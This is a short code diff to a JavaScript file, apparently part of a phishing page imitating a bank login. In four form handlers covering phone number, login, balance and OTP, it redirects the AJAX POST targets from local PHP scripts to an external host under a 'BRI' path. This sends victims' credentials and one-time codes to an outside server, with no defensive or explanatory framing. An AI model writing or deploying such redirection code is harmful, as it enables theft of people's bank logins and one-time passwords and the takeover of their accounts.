@@ -18,7 +18,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BRI/dsvla/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -44,7 +44,7 @@ function sendLogin(){
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/BRI/dsvla/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -76,7 +76,7 @@ function sendSaldo(){
   
        $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/BRI/dsvla/saldo.php',
             data: $('#saldoForm').serialize(),
             datatype: 'JSON',
         
@@ -110,7 +110,7 @@ function sendOtp(){
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://demcloud.my.id/BRI/dsvla/otp.php',
             data: $('#formOtp').serialize(),
             datatype: 'JSON',
         
